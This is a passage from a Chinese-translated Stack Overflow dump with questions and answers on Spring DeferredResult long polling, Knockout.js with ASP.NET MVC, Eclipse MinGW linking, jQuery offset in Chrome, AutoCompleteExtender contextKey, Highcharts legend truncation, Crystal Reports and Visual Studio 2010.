    </form>

    <form id="leaveChatForm" th:action="@{/mvc/chat}" data-bind="visible: activePollingXhr() != null">
        <p>
            You're chatting as <strong data-bind="text: userName"></strong>
            <button id="leave" type="submit" data-bind="click: leaveChat">Leave Chat</button>
        </p>
    </form>

    <div data-bind="visible: activePollingXhr() != null">
        <textarea rows="15" cols="60" readonly="readonly" data-bind="text: chatContent"></textarea>
    </div>

    <form id="postMessageForm" th:action="@{/mvc/chat}" data-bind="visible: activePollingXhr() != null">
        <p>
            <input id="message" name="message" type="text" data-bind="value: message" />
            <button id="post" type="submit" data-bind="click: postMessage">Post</button>
        </p>
    </form>
</body>
<script type="text/javascript" src="../../../resources/js/jquery-1.7.2.min.js" th:src="@{/resources/js/jquery-1.7.2.min.js}"></script>
<script type="text/javascript" src="../../../resources/js/knockout-2.0.0.js" th:src="@{/resources/js/knockout-2.0.0.js}"></script>
<script type="text/javascript" src="../../../resources/js/chat.js" th:src="@{/resources/js/chat.js}"></script>

</html> 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-12T10:50:59.207

为了理解 DeferredResult 在做什么，你需要理解 Servlet 3.0 Async 概念。

使用 Servlet 3.0，您可以从请求中获取 AsyncContext，将其存储在 Collection 中。

```
AsyncContext aCtx = request.startAsync(request, response); 
```

结果您的应用程序容器线程将被释放。

在单独的线程上进行一些操作并将结果写回 Servlet 响应：

```
aCtx.getResponse().getWriter().print(result); 
```

从那一点上你的`DeferredResult`作品完全一样。

小例子：

现在考虑每 5 秒您就会从第三方服务中获得报价。而且您的客户端每次都在长时间轮询您的服务器，以获取更新的内容。

你有你的控制器方法：

```
 /** put deferred result to some HashSet. This is the same logic as you 
         store async context in servlet 3.0, those are clients who are waiting for             
         response
    **/
    @RequestMapping(value="/getQuote.do", method=RequestMethod.GET)
    @ResponseBody
    public DeferredResult<String> getQuote(){
       final DeferredResult<String> deferredResult = new DeferredResult<String>();

       someMap.put(deferredResult);
       return deferredResult;
    } 
```

现在让我们看看控制器外部的方法，它获取报价并将响应返回给客户端。

```
function getQuoteAndUpdateClients(){ 

      String quote = getUpdatedQuoteFromThirdPartyService();

      for (DeferredResult<String> deferredResult: someMap){
              deferredResult.setResult(quote);
       }
 } 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-03-13T12:11:14.670

我与 Spring 的 DeferredResult 类的作者详细讨论了这个话题，这里是我们谈话的相关部分：

引用罗森·斯托扬切夫的话：

> 粗略地讲。DeferredResult 与打开的请求相关联。当请求完成时，DeferredResult 被从 map 中移除，然后，客户端发出一个新的长轮询请求，它添加了一个新的 DeferredResult 实例

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-09-20T12:17:21.517

当客户端连接时，该客户端的 DeferredResult 存储在 this.chatRequests 中。当客户端发布消息时，它会遍历所有 DeferredResults（读取客户端）以设置结果。当有 3 个客户端连接时，这种情况发生 3 次是合乎逻辑的。

# c# - Knockout.js 无法从 mvc 中的 html 表单调用

> ID：15357991
> 
> 赞同：0
> 
> 时间：2013-03-12T09:53:44.643
> 
> 标签：c#, javascript, html, asp.net-mvc, knockout.js

我刚刚开始使用 Knockout.js。我已经阅读了有关使用 mvc 中的 knockout.js 从数据库访问数据的各种教程，但没有任何效果。以下是我的表格：-

```
 <form  data-bind="submit: save" method="post" style="text-align: inherit;">
        <table>
            <tr>
                <td style="text-align: right">
                    Name:
                </td>
                <td>
                    <input type="text" placeholder="Enter Your name" data-bind="value: name" required /><br />
                </td>
            </tr>
            <tr>
                <td style="text-align: right">
                    Emp#:
                </td>
                <td>
                    <input type="text" placeholder="Enter Your Code" required data-bind="value:code" />
                </td>
            </tr>
            <tr>
                <td style="text-align: right">
                    Date of Birth:
                </td>
                <td>
                    <input type="date" placeholder="Enter Your Date Of Birth" data-bind="value:date" />
                </td>
            </tr>
            <tr>
                <td style="text-align: right">
                    Age:
                </td>
                <td>
                    <input type="number" placeholder="AGE" min="18" max="60" data-bind="value:age" /><br />
                </td>
            </tr>
            <tr>
                <td style="text-align: right">
                    Contact Number:
                </td>
                <td>
                    <input type="text" placeholder="Enter Your Contact Number" data-bind="value:contact" />
                </td>
            </tr>
            <tr>
                <td style="text-align: right">
                    Email:
                </td>
                <td>
                    <input type="email" placeholder="Enter Your Email" data-bind="value:email" />
                </td>
            </tr>
            <tr>
                <td style="text-align: right">
                    Address:
                </td>
                <td>
                    <input type="text" placeholder="Enter Your Address" data-bind="value: address" />
                </td>
            </tr>
            <tr>
                <td style="text-align: right">
                    City:
                </td>
                <td>
                    <select>
                        <option value="city" data-bind="selectedOptions:optionselect">Noida</option>
                        <option value="city" data-bind="selectedOptions:optionselect">Mumbai</option>
                    </select>
                </td>
            </tr>
            <tr>
                <td style="text-align: right">
                    Marital Status:
                </td>
                <td>
                    <input type="radio" name="martialStatus" value="Married" data-bind="checked:radioselect" />Married
                    <input type="radio" name="martialStatus" value="UnMarried" data-bind="checked:radioselect" />UnMarried
                </td>
            </tr>
            <tr>
                <td style="text-align: right">
                    Any Employee Reffrence:
                </td>
                <td>
                    <input type="checkbox" name="referal" value="yes" data-bind="checked:checkboxchecked" />
                </td>
            </tr>
        </table>
        <div style="float: right; margin-right: 15px;">
        <input type="submit" name="submit" value="Save" />
        <button type="button" value="cancel" onclick="window.close(this);">
            Cancel
        </button>
        </div>
        </form> 
```

我的javascript如下：-

```
 <script type = "text/javascript">
     var viewModel = {

   name: ko.observable(""),
    code: ko.observable(""),
   date: ko.observable(""),
   age: ko.observable(""),
   contact: ko.observable(""),
  email: ko.observable(""),
    address: ko.observable(""),
   optionselect: ko.observable(""),
   radioselect: ko.observable(""),
    checkboxchecked: ko.observable("")

    var save = function(){
     $.ajax("/Exercise/Exercise7", {
        ko.toJSON(viewModel),
        type: "post", 
        contentType: "application/json",
        success: function(result) { alert(result) }
    });
    <script> 
```

问题是：-
1）当我运行这个应用程序时，脚本没有从表单调用。2）如何将数据从脚本传输到我的控制器动作？

提前致谢！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T12:00:58.690

您可以使用[KnockOut 映射](http://knockoutjs.com/documentation/plugins-mapping.html)做类似的事情：

**模型**

```
public class ExampleKoViewModel
{
    public string SimpleName { get; set; }

    // More properties etc here...
} 
```

**控制器**

```
[HttpGet]
public ActionResult ExampleKo()
{
    return View();
}

[HttpPost]
public ActionResult ExampleKo(ExampleKoViewModel viewModel)
{
    // Do something with the value passed back
    string debugMessage = "Hello there " + viewModel.SimpleName;
    return View();
}

[OutputCache(Duration=0,VaryByParam="none")]
public JsonResult KnockoutViewModelTest()
{
    // Build up our view model
    var viewModel = new ExampleKoViewModel();
    viewModel.SimpleName = "Fred Bloggs";

    // Send back as a Json result
    var result = new JsonResult();
    result.Data = viewModel;
    return Json(result, JsonRequestBehavior.AllowGet);
} 
```

**看法**

```
@using (Html.BeginForm())
{
    <input type="text" data-bind="text: SimpleName" name="SimpleName" id="SimpleName" />
    <button type="submit" value="Save">Save</button>
}

@Ajax.KnockoutForModel(true, true, Url.Content("KnockoutViewModelTest")) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-13T12:56:39.443

这是一个使用本机 KO 和 ASP.NET MVC 的示例：

**模型**

```
public class MyViewModel
{
    public string FirstName { get; set; }

    //other properties, etc...
} 
```

**控制器方法**

```
[HttpPost]
public JsonResult Save(MyViewModel viewModel)
{
    // do something with the data...
    string expectedName = viewModel.FirstName;

    return Json(expectedName);
} 
```

**看法**

```
<!-- Sample Markup... -->
<form data-bind="submit: mySubmitFunction">
    <input type="text" data-bind="text: firstName" />

    <!-- Your form will have other fields here... -->

    <button type="submit"></button>
</form>

<!-- KO ViewModel ... -->
<script type="text/javascript">

    var viewModel = function() {
        var self = this;

        //View Model properties...
        self.firstName = ko.observable();

        //View Model Events...
        self.mySubmitFunction = function() {

            //build up our data...
            //as complexity increases, consider
            //using a separate object to handle 
            //data access, etc..
            var postData = {};
            postData.FirstName = self.firstName;

            $.ajax({
                url: '@Url.Action("Save", "MyController")', //Your Controller Url
                data: postData,
                type: 'POST',
                contentType: 'application/json',
                success: function(data) {
                    alert(data); // should be the firstName passed back from the server
                },
                error: function(jqXHR, textStatus, errorThrown) {
                    //handle the error somehow...
                }

            });
        }
    };

    //wire up the viewModel
    $(document).ready(function(){
        var myViewModel = new ViewModel();
        ko.applyBindings(myViewModel);
    });

</script> 
```

**注意：** 传递给服务器的 JSON 将通过 ASP.NET MVC 框架“自动”绑定到您的视图模型，只要属性名称相同。

# c++ - 如何在 Eclipse 中运行使用 MinGW 编译的 C++ 程序？如何“链接（？）”？

> ID：15357992
> 
> 赞同：0
> 
> 时间：2013-03-12T09:53:46.417
> 
> 标签：c++, eclipse, mingw

开始之前：对不起，我的英语不好，我还是希望你能帮助我，我是初学者。

我有以下问题。我想在 Eclipse 中运行一个使用 boost 库和其他库的 C++ 程序。我使用 MinGW 编译器，但是当我尝试调试/运行程序时，我得到这个错误：

找不到 -lC:\Users*myusername*\Desktop\git\include 找不到 -lC:\Users*myusername*\Desktop\git\include\boost

我通过以下方式包含库：项目 -> 属性 -> C++ 常规 -> 路径和符号 -> 库 -> 在这里我添加了这 2 个文件夹（包括和提升）。在库路径中，我只包含了“include”文件夹。我还在包含选项卡中包含了“包含”。

我还在这里进行了更改：项目 -> 属性 -> C++ 构建 -> 设置 -> 工具设置。我用“include”和“boost”填充了 2 个字段（-l 和 -L）。

我不知道我能做些什么来解决这个问题。我是否必须同时添加 include 和 boost 文件夹？我问这个的原因是因为 boost 文件夹位于 include 文件夹中（如您在错误文本中所见）。

我现在的问题是：我怎样才能避免/修复这些错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T10:05:16.193

在“库”选项卡中，您必须仅指定库名称，例如您的情况下的“boost”，而不是文件夹。在库路径中，添加在“库”选项卡中指定的每个库的完整路径，以便编译器可以找到它。在“包含”选项卡上，您必须使用程序头指定文件夹的路径，我想添加“C:\Users*yourusername*\Desktop\git\include”会很好。之后，您不必在工具设置屏幕上手动填写字段，您已经在另一个选项卡上完成了。

* * *

补充：根据您的错误，我可以建议您在“库”选项卡中添加文件夹的完整路径，而不是库名称。:)

# jquery - Chrome 的 offset() 为选项返回空值

> ID：15357993
> 
> 赞同：8
> 
> 时间：2013-03-12T09:53:47.017
> 
> 标签：jquery, google-chrome, firefox

我无法计算选择中选项的偏移位置：

```
<select multiple="true">
    <option>asdf</option>
    <option id="bar">qwer</option>
</select>

$("#bar").offset() 
```

Chrome 返回（任何 jQuery 版本，如 1.7.2、1.9 测试）：

```
{top: 0, left: 0} 
```

FF 返回：

```
{top: 26, left: 9} 
```

我需要像FF回报这样的职位。Chrome有解决方法吗？

[http://jsfiddle.net/YrRLx/](http://jsfiddle.net/YrRLx/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-15T12:42:32.787

啊...我能想到的一种解决方案是用 ul 对象替换 select，并附加事件处理程序以将 select 同步到 ul。在 li 元素上调用 .offset() 可以在 FF 和 Chrome 上按预期工作。

所以如果你点击 li 元素，它将更新其背景颜色并更新隐藏选择的选定值。这样，当提交表单时，会发送正确的值。

[http://jsfiddle.net/hqYqh/](http://jsfiddle.net/hqYqh/)

HTML：

```
<select id="mySelect" multiple="true">
    <option>2011</option>
    <option>2012</option>
    <option>2013</option>
    <option>2014</option>
    <option>2015</option>
    <option>2016</option>
    <option>2017</option>
    <option>2018</option>
    <option>2019</option>
</select> 
```

CSS：

```
ul.select {
    display: inline-block;
    border: 1px solid black;
    list-style: none;
    margin: 0;
    padding: 2px;
    height: 80px;
    overflow: auto;
    width: 50px;
}

ul.select li {
    background-color: none;
    cursor: pointer;
}

ul.select li.selected {
    background-color: skyblue;
} 
```

JS：

```
var $select = $('#mySelect');
var $ul = $('<ul class="select">').on('click', 'li', function() {
    $(this).parent().find('li').removeClass('selected');
    $(this).addClass('selected');
    $select.val($(this).text()).change();
});

$select.find('option').each(function() {
    var $li = $('<li>').text($(this).text());
    $ul.append($li);
});

$select.hide().after($ul);

$select.change(function() {
    alert('Offset of ' + $(this).val() + ' is ' + JSON.stringify($('li.selected').offset()));
}); 
```

# 已编辑

所以，我按照Huangism的建议尝试了另一种方法，使用select元素的offset()和scrollTop()。

唯一不可用的是选项元素的高度。所以我尝试使用 font-size 进行估算，但它并不完美，我不得不在 Chrome 上添加幻数 3 以获得确切的偏移量。如果能算出option元素的高度，就不用处理上面所有的ul/li业务了。

这里是：

[http://jsfiddle.net/hqYqh/2/](http://jsfiddle.net/hqYqh/2/)

```
optionOffset = function($option) {
    var i = $option.index();
    var h = Number($option.css('font-size').replace(/px/, '')) + 3; // Cannot get the height of the option element :(
    var $select = $option.parent();
    var offset = $select.offset();
    offset.top += i*h - $select.scrollTop();
    return offset;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T21:24:20.980

我会说 chrome 返回 0 由于该选项不可见，因此无法计算顶部。这也可能发生在 safari 中，因为它都是 webkit 浏览器。我唯一能想到的是你得到选择的偏移顶部，然后做一些计算来得到选项的近似顶部。例如，如果一个选项的高度约为 10 像素，您需要知道在您想要的选项之前有多少个选项，并计算出需要添加到选择顶部的像素数。

# ajax - 如何将自定义值传递给 AutocompleteExtender？

> ID：15357994
> 
> 赞同：1
> 
> 时间：2013-03-12T09:53:51.277
> 
> 标签：ajax, autocomplete, ajaxcontroltoolkit

我有这个文本框和 AutocompleteExtender

```
<asp:TextBox ID="txtItemName" runat="server" ClientIDMode="Static"
MaxLength="300" onfocus="javascript:select();"
></asp:TextBox>
<cc1:AutoCompleteExtender runat="server" ID="autoComplete1" TargetControlID="txtItemName" EnableCaching="true"
ServicePath="~/AutoComplete.asmx" ServiceMethod="GetCompletionList" MinimumPrefixLength="1" 
CompletionInterval="10" CompletionSetCount="15" FirstRowSelected="True" CompletionListCssClass="AutoExtender"
CompletionListItemCssClass="AutoExtenderList" CompletionListHighlightedItemCssClass="AutoExtenderHighlight"
>
</cc1:AutoCompleteExtender> 
```

该方法定义为

```
[WebMethod]
public string[] GetCompletionList(string prefixText, int count, string contextKey)
{
List<string> items = new List<string>(count);
SqlCommand con = new SqlCommand();
SqlDataReader sdr = null;
DataSet ds = new DataSet();
try
{
    SqlCommand cmd = new SqlCommand();

    cmd.CommandText = "proc_NewBooking";
    cmd.CommandType = CommandType.StoredProcedure;
    cmd.Parameters.AddWithValue("@BranchId", Globals.BranchID);
    cmd.Parameters.AddWithValue("@ItemName", prefixText.ToString());
    cmd.Parameters.AddWithValue("@Flag", 11);
    sdr = AppClass.ExecuteReader(cmd);
    ds = AppClass.GetData(cmd);
    while (sdr.Read())
    {
        items.Add("" + sdr.GetValue(0));
    }
    sdr.Close();
    sdr.Dispose();
}
catch (Exception ex)
{
          // Log the message and continue  
}
return items.ToArray();
} 
```

我想要的是传递一个自定义值，[文档](http://www.asp.net/ajaxLibrary/AjaxControlToolkitSampleSite/AutoComplete/AutoComplete.aspx)说我们可以使用`contextKey`属性来做到这一点

所以，我将此行添加到`AutocompleteExtender`.

```
<cc1:AutoCompleteExtender runat="server" ID="autoComplete1" TargetControlID="txtItemName" EnableCaching="true"
ServicePath="~/AutoComplete.asmx" ServiceMethod="GetCompletionList" MinimumPrefixLength="1" 
ContextKey="javascript:document.getElementById('drpCustomerType').value"
CompletionInterval="10" CompletionSetCount="15" FirstRowSelected="True" CompletionListCssClass="AutoExtender"
CompletionListItemCssClass="AutoExtenderList" CompletionListHighlightedItemCssClass="AutoExtenderHighlight"
>
</cc1:AutoCompleteExtender> 
```

并重载方法以接受它，如下所示，

```
 public string[] GetCompletionList(string prefixText, int count, string contextKey)
 {
      // custom code based on context key
 } 
```

但是当调试器点击它时，我没有得到值，`drpCustomerType`而是得到硬编码的字符串“javascript:document.getElementById('drpCustomerType').value”？

谁能告诉我如何将值传递`drpCustomerType`给这个方法，以便我可以根据它显示项目列表？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-12T10:57:11.687

您需要`OnClientPopulating`在 JavaScript 中处理事件并`contextKey`在处理程序中设置属性值：

```
function autoComplete1_OnClientPopulating(sender, args) {
    sender.set_contextKey(document.getElementById('drpCustomerType').value);
}

<cc1:AutoCompleteExtender runat="server" ID="autoComplete1" TargetControlID="txtItemName" EnableCaching="true"
ServicePath="~/AutoComplete.asmx" ServiceMethod="GetCompletionList" MinimumPrefixLength="1" 
UseContextKey="true"
CompletionInterval="10" CompletionSetCount="15" FirstRowSelected="True" CompletionListCssClass="AutoExtender"
CompletionListItemCssClass="AutoExtenderList" 
OnClientPopulating="autoComplete1_OnClientPopulating"
CompletionListHighlightedItemCssClass="AutoExtenderHighlight" /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-18T11:07:00.660

```
 You can do it using Hidden Field, In Code Behind you didnot pass ContextKey anywhere
 Find the session and store it in hidden field at page load that will be your drpCustomerType 

   Do like this in WebMethod 

   [System.Web.Services.WebMethod (EnableSession=true)]

      contextkey= Convert.ToInt32(HttpContext.Current.Session["drpCustomerType "].ToString());
        cmd.Parameters.AddWithValue("@drp ", contextkey);

     @drp = Variable Declare in SP 
```

# javascript - 是否可以截断 Highcharts/Highstock 中的图例项目

> ID：15357995
> 
> 赞同：2
> 
> 时间：2013-03-12T09:53:51.417
> 
> 标签：javascript, html, css, highcharts, highstock

使用页面宽度可以缩小和扩大的响应式网站，图例中的项目是否可以截断？

系列标题可能很长，所以理想情况下，我希望将图例项设置为图表的 95% 左右，如果它们太长，则添加省略号。

我尝试使用 HTML 作为图例并使用 CSS 应用省略号，但这不起作用。任何帮助都会很棒，谢谢。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2015-02-19T19:25:29.723

最新 (4.1.1) 版本的 Highcharts 支持截断的内联样式。所以你可以这样做：

```
legend:{
    itemStyle: {
            width:'50px',
            textOverflow: 'ellipsis',
            overflow: 'hidden'
        }  
} 
```

[http://jsfiddle.net/awq913h1/](http://jsfiddle.net/awq913h1/)

* * *

相关 github 问题：[https](https://github.com/highcharts/highcharts/issues/3331)
://github.com/highcharts/highcharts/issues/3331 相关 JsFiddle：http: [//jsfiddle.net/highcharts/d4johssh/](http://jsfiddle.net/highcharts/d4johssh/)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-03-12T10:51:08.743

可以对图例中的标签做任何事情，只需使用 labelFormatter 函数。

```
// ... initialization of chart
legend: {
    labelFormatter: function() {
        // do truncation here and return string
        // this.name holds the whole label
        // for example:
        return this.name.slice(0, 15)+'...'
    }
} 
```

这是工作示例[http://jsbin.com/oyicuc/12/edit](http://jsbin.com/oyicuc/12/edit)

编辑（基于下面的评论）。

如果您想更好地控制标签文本的行为方式，请将 useHTML 属性设置为 true（在图表的图例配置中），然后您可以使用 css 更好地定位它。这是它的示例[http://jsbin.com/oyicuc/20/edit](http://jsbin.com/oyicuc/20/edit)。

为了使其响应，您可以监听图表的重绘事件并相应地修改标签的 css。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-10T14:49:58.187

这类似于@WTK 的答案，但它只会截断比所需长度更长的标签。

```
formatter: function () {
    //Truncate very long labels
    var max = 20;
    var val = this.value;
    return (val.length > max ? val.slice(0, max) + '...' : val);
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-09-19T03:23:52.773

我采用了 WTK 的解决方案（顺便感谢它）并在其中添加了一些简单的东西 - 认为它可能会对某人有所帮助。（编辑：哎呀 - 错过了克里斯的帖子 - 也与他的类似，但考虑到宽度）

1.  指定图表左侧边距的宽度 - 这决定了标签有多少空间 - 如果您有一个水平缩放到页面的图表，这很重要 - 如果区域为标签不够大。

2.  指定刻度长度以匹配边距。

3.  检查字符串的长度 - 如果它比我想要的大（即，如果它要换行/导致问题），我会截断它 - 否则将省略号 (...) 附加到它上面是没有意义的。这基本上意味着：

    *   检查它是否是 24 个（在我的情况下）字符长，如果它被截断三个字符（21 个）并将省略号附加到临时值。制作 24 字符标签和截断标签的长度看起来仍然相似。如果长度不超过 24 - 不需要截断并且 temp var 设置为字符串的全长。

    *   我不只是吐出标签的截断版本，而是将标签包装在带有标题的跨度中。允许用户将鼠标悬停在标签上并获取值的全名。

4.  跨度/标题使用 HTML 输出。

希望这可以帮助某人:)

```
chart: {
    // usual setup stuff here
    marginLeft: 160 // #1
}

// ...

xAxis: {
    // ...
    tickLength: 160, // #2
    labels: {
        // ...
        formatter: function() {
            var temp = this.value.length > 24 ? this.value.slice(0, 21)+'...' : this.value; // #3
            return '<span title="Investment breakdown for '+ this.value +'">' + temp + '</span>'; // #3
        },
        useHTML: true // #4
} 
```

# c#-4.0 - 使用 Crystal Report 公式打印一些文本行

> ID：15357998
> 
> 赞同：0
> 
> 时间：2013-03-12T09:53:54.547
> 
> 标签：c#-4.0, printing, crystal-reports, formula

我有一些想法如何完成这项任务，但我被困在两者之间。我想根据水晶报告中值字段的计数打印一些行。

我检查了共同申请人的数量，并根据数量，我想打印确切的签名区域，他们可以在打印输出时签名。

有什么办法吗？我们用来打印线条的功能是什么，告诉我这个，剩下的我来处理。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T18:16:38.953

没有特定的打印功能，任何公式的最后一行的结果都是打印的。计算文本输出最简单的方法是为输出创建一个本地 StringVar，然后让函数的最后一行只是该变量的名称（它将打印变量的内容）。

另一件事可能会有所帮助：如果您使用字符代码，则使用 return/newline ("\r\n") 将在 Crystal 文本字段中工作。 `"line1" + chr(13) + chr(10) + "line2"` 请务必在该字段上设置“可以增长”选项。

# visual-studio-2010 - Visual Studio 2010 以管理员身份运行时无法启动 Web 浏览器

> ID：15357999
> 
> 赞同：1
> 
> 时间：2013-03-12T09:53:54.900
> 
> 标签：visual-studio-2010

当我以管理员身份运行 VS2010 时，我无法打开外部 Web 浏览器以获取帮助、扩展管理器中的链接等。当不在管理员模式下时，一切都很好。

有想法该怎么解决这个吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:57:06.763

如果您与其他用户安装了管理员，则可能会发生这种情况，

只需重新安装/或开始修复，这可能会有所帮助，

如果询问，请选择为所有用户安装，而不是“仅我”。

我希望这可以解决，

否则只需卸载并重新安装。

小心，